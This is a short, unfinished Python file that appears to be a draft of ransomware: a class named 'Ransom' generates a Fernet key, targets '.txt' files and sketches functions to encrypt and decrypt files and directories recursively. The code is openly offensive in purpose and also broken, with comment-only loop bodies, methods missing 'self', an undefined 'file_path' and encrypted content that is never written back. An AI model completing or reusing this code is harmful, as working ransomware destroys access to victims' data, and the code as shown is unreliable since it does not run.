
from cryptography.fernet import Fernet 

class Ransom:

    def __init__(self, key = None, targets = None):
        # TOdO
        if key != None:
            self.key = key
        else:
            self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.targets = ['.txt']

    def encryptDirectory(dir):
        for file in dir:
            # ENcrypt file
        for d in dir:
            # ENcrypt directory recursive
        pass

        
    def encryptFile(self, file):
        with open(file_path, 'rb+') as f:
            content = f.read()
            content = self.fernet.encrypt(content)
    


    def decryptDirectory(dir):
        for file in dir:
            # DEcrypt file
        for d in dir:
            # DEcrypt directory recursive
        pass
    def decryptFile(file):
        # TOdo
        pass
    

def main():
    ransom = Ransom()
    print(ransom.key)


if __name__ == '__main__':
    main()

    

        

    